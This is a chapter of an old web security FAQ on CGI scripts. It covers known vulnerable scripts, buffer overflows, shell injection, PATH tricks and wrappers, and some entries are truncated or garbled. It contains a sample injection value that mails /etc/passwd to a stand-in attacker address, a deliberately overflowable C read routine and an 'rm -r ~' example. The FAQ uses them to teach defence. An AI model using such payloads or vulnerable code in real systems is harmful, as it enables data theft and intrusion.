<H1><A NAME="CGI">6. CGI (Server) Scripts</A></H1>

<H2><A NAME="Q31">Q31: What's the problem with CGI scripts?</A></H2>

The problem with CGI scripts is that each one presents yet another
opportunity for exploitable bugs.  CGI scripts should be written with
the same care and attention given to Internet servers themselves,
because, in fact, they are miniature servers.  Unfortunately, for many
Web authors, CGI scripts are their first encounter with network
programming.

<p>
CGI scripts can present security holes in two ways:

<OL>
  <LI> They may intentionally or unintentionally leak information about
the host system that will help hackers break in.

  <LI> Scripts that process remote user input, such as the contents of a
form or a "searchable index" command, may be vulnerable to attacks in
which the remote user tricks them into executing commands.

</OL>
<p>
CGI scripts are potential security holes even though you run your
server as "nobody".  A subverted CGI script running as "nobody" still
has enough privileges to mail out the system password file, examine
the network information maps, or launch a log-in session on a high
numbered port (it just needs to execute a few commands in Perl to
accomplish this).  Even if your server runs in a chroot directory, a
buggy CGI script can leak sufficient system information to compromise
the host.

<HR>

<H2><A NAME="Q32">Q32: Is it better to store scripts in the cgi-bin directory, or to
     store them anywhere in the document tree and identify them to the
     server using the .cgi extension?</A></H2>

Although there's nothing intrinsically dangerous about scattering CGI
scripts around the document tree, it's better to store them in the
cgi-bin directory. Because CGI scripts are such potentially large
security holes, it's much easier to keep track of what scripts are
installed on your system if they're kept in a central location rather
than being scattered around among multiple directories.  This is
particularly true in an environment with multiple Web authors.  It's
just too easy for an author to inadverently create a buggy CGI script
and install it somewhere in the document tree.  By restricting CGI
scripts to the cgi-bin directory and by setting up permissions so that
only the Web administrator can install these scripts, you avoid this
chaotic situation.

<p>
There's also a risk of a hacker managing to create a .cgi file
somewhere in your document tree and then executing it remotely by
requesting its URL.  A cgi-bin directory with tightly-controlled access
lessens
the possibility of this happening.

<HR>

<H2><A NAME="Q33">Q33: Are compiled languages such as C safer than interpreted
     languages like Perl and shell scripts?</A></H2>

The answer is "yes", but with many qualifications and explanations.

<p>
First of all is the issue of the remote user's access to the script's
source code.  The more the hacker knows about how a script works, the
more likely he is to find bugs to exploit.  With a script written in a
compiled language like C, you can compile it to binary form, place it
in cgi-bin/, and not worry about intruders gaining access to the
source code.  However, with an interpreted script, the source code is
always potentially available.  Even though a properly-configured
server will not return the source code to an executable script, there
are many scenarios in which this can be bypassed.

<p>
Consider the following scenario.  For convenience's sake, you've
decided to identify CGI scripts to the server using the .cgi
extension.  Later on, you need to make a small change to an
interpreted CGI script.  You open it up with the Emacs text editor and
modify the script.  Unfortunately the edit leaves a backup copy of the
script source code lying around in the document tree.  Although the
remote user can't obtain the source code by fetching the script
itself, he can now obtain the backup copy by blindly requesting the
<STRONG>URL:</STRONG>

<PRE>
        http://your-site/a/path/your_script.cgi~

</PRE>
(This is another good reason to limit CGI scripts to cgi-bin and to
make sure that cgi-bin is separate from the document root.)

<p>
Of course in many cases the source code to a CGI script written in C
is freely available on the Web, and the ability of hackers to steal
the source code isn't an issue.

<p>
Another reason that compiled code may be safer than interpreted code
is the size and complexity issue.  Big software programs, such as
shell and Perl interpreters, are likely to contain bugs.  Some of
these bugs may be security holes.  They're there, but we just don't
know about them.

<p>
A third consideration is that the scripting languages make it
extremely easy to send data to system commands and capture their
output.  As explained below, the invocation of system commands from
within scripts is one of the major potential security holes.  In C,
it's more effort to invoke a system command, so it's less likely that
the programmer will do it.  In particular, it's very difficult to
write a shell script of any complexity that completely avoids
dangerous constructions.  Shell scripting languages are poor choices
for anything more than trivial CGI programs.

<p>
All this being said, please understand that I am not guaranteeing that
a compiled program will be safe.  C programs can contain many
exploitable bugs, as the net's experiences with NCSA httpd 1.3 and
sendmail shows.  Counterbalancing the problems with interpreted
scripts is that they tend to be shorter and are therefore more easily
understood by other people than the author. Furthermore, Perl contains
a number of built-in features that were designed to catch potential
security holes.  For example, the taint checks (see below) catch many
of the common pitfalls in CGI scripting, and may make Perl scripts
safer in some respects than the equivalent C program.

<HR>

<H2><A NAME="Q34">Q34: I found a great CGI script on the Web and I want to install
     it.  How can I tell if it's safe?</A></H2>

<p>
You can never be sure that a script is safe.  The best you can do is
to examine it carefully and understand what it's doing and how it's
doing it.  If you don't understand the language the script's written
in, show it to someone who does.

<p>
Things to think about when you examine a script:

<OL>
  <LI> How complex is it?  The longer it is, the more likely it is to
have problems.

  <LI> Does it read or write files on the host system?  Programs that
read files may inadvertently violate access restrictions you've set
up, or pass sensitive system information to hackers.  Programs that
write files have the potential to modify or damage documents, or, in
the worst case, introduce trojan horses to your system.

  <LI> Does it interact with other programs on your system?  For example,
many CGI scripts send e-mail in response to a form input by opening up
a connection with the sendmail program.  Is it doing this in a safe
way?

  <LI> Does it run with suid (set-user-id) privileges?  In general this
is a very dangerous thing and scripts need to have excellent reasons
for doing this.

  <LI> Does the author validate user input from forms?  Checking form
input is a sign that the author is thinking about security issues.

  <LI> Does the author use explicit path names when invoking external
programs?  Relying on the PATH environment variable to resolve partial
path names is a dangerous practice.

</OL>

<HR>

<H2><A NAME="Q35">Q35: What CGI scripts are known to contain security holes?</A></H2>

Quite a number of widely distributed CGI scripts contain known
security holes.  Many of the ones that are identified here have since
been caught and fixed, but if you are running an older version of the
script you may still be vulnerable.  Get rid of it and obtain the
latest version.  If there is no fix for a script, just get rid of it.

<DL>
  <dt>HotMail
  <dd>The CGI scripts that run the popular HotMail e-mail system use a
      flawed security system that allows unauthorized individuals to
      break into user's e-mail accounts and read their mail.  This
      problem is known to affect the version of HotMail that was in
      place as of December 1998.  For further information, see these
      links:

  <p>
  <dt>Matt Wright's TextCounter versions 1.0-1.2 (Perl) and 1.0-1.3 (C++) (June 1998)
  <dd>Earlier versions TextCounter program, which is used to place
      page hit counts on pages, fails to remove shell metacharacters
      from user-provided input. As a result remote users can execute
      shell commands on the server host.  This affects both the Perl
      and C++ versions.  Please upgrade to version 1.21 (Perl) or
      version 1.31 (C++):

	<li>(Perl) <a

      </ul>
  <p>

  <dt>Various guestbook scripts (June 1998)
  <dd>There continue to be reports of exploits involving various
      guestbook scripts.  This was first identified in the Selena Sol
      guestbook, but affects other scripts as well.  These exploits
      take advantage of scripts
      that do not strip HTML tags from user-provided input and which,
      furthermore, write the guestbook file to a directory that allows
      server-side includes.  Guestbook scripts should strip HTML tags,
      or replace angle brackets with the &amp;gt; and &amp;lt;
      character entities.  The files that they write to should
      <strong>not</strong> be in a directory that allows server-side
      includes, active server pages, PHP pages, or other HTML 
      template systems.  See the full description of the problem in
      the Selena Sol/Extropia archive at <a
      href="http://www.extropia.com/">http://www.extropia.com/</a>
  <p>

  <dt>Excite Web Search Engine (EWS) version (November 1998)
  <dd>The Excite Web Search engine stores critical security
      information (including the encrypted administrative password) in
      world writable files.  This allows unprivileged local users to
      gain access to the EWS administrative front end on both Unix and
      NT systems.

      <p>

      Note that this bug only endangers your
      Web site if you have the search engine installed locally.  It
      does not affect sites that link to Excite.com's search pages, or
      sites that are indexed by the Excite robot.

      <p>

      A worse problem is found in unpatched versions of EWS earlier than
      Feburary 1998 (unfortunately, also called version 1.1).  This
      bug involves the failure to check user-supplied
      parameters before passing them to the shell, allowing remote
      users to execute shell commands on the server host.  The
      commands will be executed with the privileges of the Web
      server.

  <dt>info2www, versions 1.0-1.1
  <dd>info2www, which converts GNU "info" files into Web pages,
      fails to check user-provided filenames before opening them.  As
      a result, it can be tricked into opening system files or
      executing commands containing shell metacharacters.  Versions
      1.2 and higher are reported to be free of the problem, but due
      to the many extant versions of this script, you should probably
      examine the source code yourself before installing it.  Also
      scrutinize the CGI scripts info2html and infogate, which are
      apparently based on info2www.
      <p>
  <dt>Count.cgi, versions 1.0-2.3
  <dd>Count.cgi, widely used to produce page hit counts, contains a
      stack overflow bug that allows malicious remote users to execute
      Unix commands on the server by sending the script carefully
      crafted query strings.  Version 2.4 corrects this bug.  It can
      be found at <a href=" http://www.fccc.edu/users/muquit/Count.html"> http://www.fccc.edu/users/muquit/Count.html</a>.

  <dd>This script is part of a system that allows users to install
      and distribute software across the network.  Due to inadequate
      checking of CGI parameters, remote users can execute commands on
      the server system with the permissions of the server daemon.
  <dd><strong>This bug has not been fixed as of June 12, 1997</strong>.
      Contact Mindshare for patches/workarounds.  Until your
      copy of webdist.cgi is fixed, disable it by removing its execute
      permissions.
      <p>
  <dt>php.cgi, multiple versions
  <dd>The php.cgi script, which provides an HTML-embedded programming
      language embedded
      in HTML pages, database access, and other nice features, should
      <strong>never</strong> be installed in the scripts (cgi-bin) directory.  This 
      allows anyone on the Internet to run shell commands on the
      Web server host machine.  In addition, versions through 2.0b11 contain
      known security holes.  Be sure to update to the most recent
      version and check the PHP site (see URL below) for other
      security-related news.  The <strong>Apache module</strong> version of 
      PHP, since it does not run as a CGI script, is said not contain
      these holes.  Nevertheless, you are encouraged to keep your
      system current.

      example CGI script that comes with the Novell WebServer
      installation allows users to view any file or directory on your
      system, compromising confidentail documents, and potentially

<p>

To my eternal chagrin, one of the buggy CGI scripts to be discovered
is in <cite>nph-publish</cite>, a script that I wrote myself to allow
HTML documents to be "published" to the Apache web server from a
publish-savvy editor such as Netscape Navigator Gold.  I didn't check
user-provided pathnames correctly, potentially allowing the script to
write files into places where they aren't allowed.  If the server is
run with too many privileges, this can cause big problems.  <strong>If
you use this script, please upgrade to version 1.2 or higher.</strong>
The bug was discovered by Randal Schwartz (<a
href="mailto:merlyn@stonehenge.com">merlyn@stonehenge.com</a>).

<p>

The holes in the second two scripts on the list were discovered by
Paul Phillips (<A HREF="mailto:paulp@cerf.net">paulp@cerf.net</A>),
who also wrote the <A
HREF="http://www.go2net.com/people/paulp/cgi-security/safe-cgi.txt">CGI
security FAQ</A>.  The hole in the PHF (phone book) script was
discovered by Jennifer Myers <a
href="mailto:jmyers@marigold.eecs.nwu.edu">
(jmyers@marigold.eecs.nwu.edu)</a>, and is representative of a
potential security hole in all CGI scripts that use NCSA's
<code>util.c</code> library.  <a href="wwwsf8.html#util.c">Here's a
patch</a> to fix the problem in <code>util.c</code>.

<p>

Reports of other buggy scripts will be posted here on an intermittent
basis.

<p>

In addition, one of the scripts given as an example of "good CGI
scripting" in the published book "Build a Web Site" by net.Genesis and
Devra Hall contains the classic error of passing an unchecked user
variable to the shell.  The script in question is in Section 11.4,
"Basic Search Script Using Grep", page 443.  Other scripts in this
book may contain similar security holes.

<p>

This list is far from complete.  No centralized authority is
monitoring all the CGI scripts that are released to the public; the
CERT does issue alerts about buggy CGI scripts when it learns about
them, and it's a good idea to subscribe to their mailing list, or to
browse the alert archive from time to time (see <a
href="wwwsf9.html#bibliography">the bibliography</a>).

<p>

Ultimately it's up to you to examine each script and make sure that
it's not doing anything unsafe.

<HR>

<H2><A NAME="Q36">Q36: I'm developing custom CGI scripts.  What unsafe practices
     should I avoid?</A></H2>

<OL>
  <LI> Avoid giving out too much information about your site and server
       host.
<p>
       Although they can be used to create neat effects, scripts that leak
       system information are to be avoided.  For example, the "finger"
       command often prints out the physical path to the fingered user's home
       directory and scripts that invoke finger leak this information (you
       really should disable the finger daemon entirely, preferably by
       removing it).  The <TT>w</TT> command gives information about what programs
       local users are using.  The <TT>ps</TT> command, in all its shapes and forms,
       gives would-be intruders valuable information on what daemons are
       running on your system.

<p>
  <LI> If you're coding in a compiled language like C, avoid making
       assumptions about the size of user input.

<p>
       A MAJOR source of security holes has been coding practices that
       allowed character buffers to overflow when reading in user input.
       Here's a simple example of the problem:

<pre>
   #include &lt;stdlib.h&gt;<BR>
   #include &lt;stdio.h&gt;

   static char query_string[1024];

   char* read_POST() {<BR>

      int query_size;
      query_size=atoi(getenv("CONTENT_LENGTH"));
      fread(query_string,query_size,1,stdin);
      return query_string;

   }
</PRE>

       The problem here is that the author has made the assumption that user
       input provided by a POST request will never exceed the size of the
       static input buffer, 1024 bytes in this example.  This is not good.  A
       wily hacker can break this type of program by providing input many
       times that size.  The buffer overflows and crashes the program; in
       some circumstances the crash can be exploited by the hacker to execute
       commands remotely.

<p>
       Here's a simple version of the read_POST() function that avoids
       this problem by allocating the buffer dynamically.  If there isn't
       enough memory to hold the input, it returns NULL:

<pre>
   char* read_POST() {<BR>

      int query_size=atoi(getenv("CONTENT_LENGTH"));
      char* query_string = (char*) malloc(query_size);
      if (query_string != NULL)
         fread(query_string,query_size,1,stdin);
      return query_string;
   }
</PRE>

Of course, once you've read in the data, you should continue to make
sure your buffers don't overflow.  Watch out for strcpy(), strcat()
and other string functions that blindly copy strings until they reach
the end.  Use the strncpy() and strncat() calls instead.

<pre>
   #define MAXSTRINGLENGTH 255
   char myString[MAXSTRINGLENGTH + sizeof('\0')];
   char* query = read_POST();
   assert(query != NULL);
   strncpy(myString,query,MAXSTRINGLENGTH);
   myString[MAXSTRINGLENGTH]='\0';      /* ensure string terminator */
</pre>

(Note that the semantics of strncpy are nasty when the input string is
exactly MAXSTRINGLENGTH bytes long, leading to some necessary fiddling with
the terminating NULL.)

  <LI> <a name="bad_shell">Never</a>, <EM>never</EM>,
      <STRONG>never</STRONG>
      pass unchecked remote user input to a shell command.

<p>
       In C this includes the popen(), and system() commands, all of which
       invoke a /bin/sh subshell to process the command.  In Perl this
       includes system(), exec(), and piped open() functions as well as the
       eval() function for invoking the Perl interpreter itself.  In the
       various shells, this includes the exec and eval commands.

<p>
       Backtick quotes, available in shell interpreters and Perl for
       capturing the output of programs as text strings, are also dangerous.

<p>
       The reason for this bit of paranoia is illustrated by the following
       bit of innocent-looking Perl code that tries to send mail to an
       address indicated in a fill-out form.

<pre>
   $mail_to = &amp;get_name_from_input; # read the address from form
   open (MAIL,"| /usr/lib/sendmail $mail_to");
   print MAIL "To: $mailto\nFrom: me\n\nHi there!\n";
   close MAIL;
</pre>

The problem is in the piped open() call.  The author has assumed that
the contents of the $mail_to variable will always be an innocent
e-mail address.  But what if the wiley hacker passes an e-mail address
that looks like this?

<pre>
     nobody@nowhere.com;mail badguys@hell.org&lt;/etc/passwd;
</pre>

Now the open() statement will evaluate the following command:

<pre>
/usr/lib/sendmail nobody@nowhere.com; mail badguys@hell.org&lt;/etc/passwd
</pre>

Unintentionally, open() has mailed the contents of the system password
file to the remote user, opening the host to password cracking attack.
</OL>

<HR>

<H2><A NAME="Q37">Q37: But if I avoid eval(), exec(), popen() and system(), how can I
     create an interface to my database/search engine/graphics
     package?</A></H2>

You don't have to avoid these calls completely.  You just have to
understand what you're doing before you call them.  In some cases you
can avoid passing user-supplied variables through the shell by calling
external programs differently.  For example, sendmail supports a -t
option, which tells it to ignore the address given on the command line
and take its To: address from the e-mail header.  The example above
can be rewritten in order to take advantage of this feature as shown
below (it also uses the -oi flag to prevent sendmail from ending the
message prematurely if it encounters a period at the start of a line):

<pre>
   $mailto = &amp;get_name_from_input; # read the address from form
   open (MAIL,"| /usr/lib/sendmail -t -oi");
   print MAIL &lt;&lt;END;
   To: $mailto
   From: me (me\@nowhere.com)
   Subject: nothing much

   Hi there!

C programmers can use the exec family of commands to pass arguments
directly to programs rather than going through the shell.  This can
also be accomplished in Perl using the technique described below.

<p>
You should try to find ways not to open a shell.  In the rare cases
when you have no choice, you should <em>always</em> scan the arguments for
shell metacharacters and remove them.  The list of shell
metacharacters is extensive:
<pre>
         &amp;;`'\"|*?~&lt;&gt;^()[]{}$\n\r
</pre>
Notice that it contains the carriage return and newline characters,
something that someone at NCSA forgot when he or she wrote the
widely-distributed <a href="wwwsf8.html#util.c"><code>util.c</code> library</a>
as an example of CGI scripting in C.
<p>
It's a better policy to make sure that all user input
arguments are exactly what you expect rather than blindly remove shell
metacharacters and hope there aren't any unexpected side-effects.  Even if
you avoid the shell and pass user variables directly to a program, you
can never be sure that they don't contain constructions that reveal
holes in the programs you're calling.

<p>
For example, here's a way to make sure that the $mail_to address
created by the user really <EM>does</EM> look like a valid address:

<pre>
  $mail_to = &amp;get_name_from_input; # read the address from form
  unless ($mail_to =~ /^[\w.+-]+\@[\w.+-]+$/) {
     die 'Address not in form foo@nowhere.com';
  }
</pre>
(This particular pattern match may be too restrictive for some sites.
It doesn't allow UUCP-style addresses or any of the many alternative
addressing schemes).

<H2><A NAME="Q38">Q38: Is it safe to rely on the PATH environment variable to locate
     external programs?</A></H2>

Not really.  One favorite hacker's trick is to alter the PATH
environment variable so that it points to the program he wants your
script to execute rather than the program you're expecting.  In
addition to avoiding passing unchecked user variables to external
programs, you should also invoke the programs using their full
absolute pathnames rather than relying on the PATH environment
variable.  That is, instead of this fragment of C code:

<pre>
   system("ls -l /local/web/foo");
</pre>

use this:

<pre>
   system("/bin/ls -l /local/web/foo");
</pre>

If you must rely on the PATH, set it yourself at the beginning of your
CGI script:

<pre>
   putenv("PATH=/bin:/usr/bin:/usr/local/bin");
</pre>

<p>
In general it's not a good idea to put the current directory (".")
into the path.

<HR>

<H2><A NAME="Q39">Q39: What are CGI "wrappers"?  Can they make CGI
scripts safee?</A></H2>

<p>

Nothing can automatically make CGI scripts completely safe, but you
can make them safer in some situations by placing them inside a CGI
"wrapper" script.  Wrappers may perform certain security checks on the
script, change the ownership of the CGI process, or use the Unix
chroot mechanism to place the script inside a restricted part of the
file system.

<p>

There are a number of wrappers available for Unix systems:

<h3>cgiwrap</h3>

The <A HREF="http://www.umr.edu/~cgiwrap">cgiwrap</A> program, written
by Nathan Neulinger (&lt;<A
HREF="mailto:nneul@umr.edu">nneul@umr.edu</A>&gt;) was designed for
multi-user sites like university campuses where local users are
allowed to create their own scripts.  Since CGI scripts run under the
server's user ID (e.g. "nobody"), it is difficult under these
circumstances for administrators to determine whose script is
generating bounced mail, errors in the server log, or annoying
messages on other user's screens.  There are also security
implications when all users' scripts run with the same permissions:
one user's script can unintentionally (or intentionally) trash the
database maintained by another user's script.

<p>

<A HREF="http://www.umr.edu/~cgiwrap">cgiwrap</A> allows you to put a
wrapper around CGI scripts so that a user's scripts now run under his
own user ID.  This policy can be enforced so that users <em>must</em>
use cgiwrap in order to execute CGI scripts.  This simplifies
administration and prevents users from interfering with each other.

<p>

However you should be aware that this type of wrapper does increase
the risk to the individual user.  Because his scripts now run with his
own permissions, a subverted CGI script can trash his home directory
by executing the command:

<pre>
    rm -r ~
</pre>

<p>

Since the subverted CGI script has write access to the user's home
directory, it could also place a trojan horse in the user's directory.

<h3><a name="sbox">sbox</a></h3>

<p>

Another wrapper is <a
href="http://stein.cshl.org/software/sbox/">sbox</a>, written by the
author.  Like cgiwrap, it can run scripts as the CGI author's user
and/or group.  However, it takes additional steps to prevent CGI
scripts from causing damage.  For one thing, <cite>sbox</cite>
optionally performs a <cite>chroot</cite> to a restricted directory,
sealing the script off from the user's home directory and much of the
rest of the file system.  For another, you can use <cite>sbox</cite>
to set resource allocation limitations on CGI scripts.  This prevents
certain denial-of-service attacks. 

<p>

When running under the Unix version of Apache, <a
href="http://stein.cshl.org/software/sbox/">sbox</a> supports
user-maintained directories and virtual hosts.

<h3>suEXEC</h3>

The <a href="http://www.apache.org/">Apache</a> Web server comes with
its own wrapper script called <cite>suEXEC</cite>.  suEXEC is tightly
integrated with the Apache server and cannot be used with other Web
servers.  suEXEC provides the same functionality as cgiwrap, but in
addition works hand-in-hand with Apache's virtual host system.  You
can provide <cite>User</cite> and <cite>Group</cite> directives to the
&lt;VirtualHost&gt; section to have scripts run with the permissions
of that user and group.

<HR>

<H2><A NAME="Q40">Q40: People can only use scripts if they're accessed from a form that
     lives on my local system, right?</A></H2>

Not right.  Although you can restrict access to a script to certain IP
addresses or to user name/password combinations, you can't control how
the script is invoked.  A script can be invoked from any form,
anywhere in the world.  Or its form interface can be bypassed entirely
and the script invoked by directly requesting its URL.  Don't assume
that a script will always be invoked from the form you wrote to go
with it.  Anticipate that some parameters will be missing or won't
have the expected values.

<p>
When restricting access to a script, remember to put the restrictions
on the _script_ as well as any HTML forms that access it.  It's
easiest to remember this when the script is of the kind that generates
its own form on the fly.

<HR>

<H2><A NAME="Q41">Q41: Can people see or change the values in "hidden"
form variables?</A></H2>

They sure can!  The hidden variable is visible in the raw HTML that
the server sends to the browser.  To see the hidden variables, a user
just has to select "view source" from the browser menu.  In the same
vein, there's nothing preventing a user from setting hidden variables
to whatever he likes and sending it back to your script.  Don't rely
on hidden variables for security.

<HR>

<H2><A NAME="Q42">Q42: Is using the "POST" method for submitting forms
more private than <STRONG>"GET"?</STRONG></A></H2>

If you are concerned about your queries showing up in server logs, or
those of Web proxies along the way, this is true. Queries submitted
with POST usually don't appear in logs, while GET queries do.  In
other respects, however, there's no substantial difference in security
between the two methods.  It is just as easy to intercept unencrypted
GET queries as POST queries.  Furthermore, unlike some early
implementations of HTTP encryption, the current generation of data
encrypting server/browser combinations do just as good a job
encrypting GET requests as they do for POST requests.

This document contains a great deal of useful advice, but has not been
updated since September 1995.  More recently, Selena Sol has published
an excellent article on the risks of installing pre-built CGI scripts,
with much helpful advice on configuring and customizing these scripts
to increase their security.  This article can be found at:
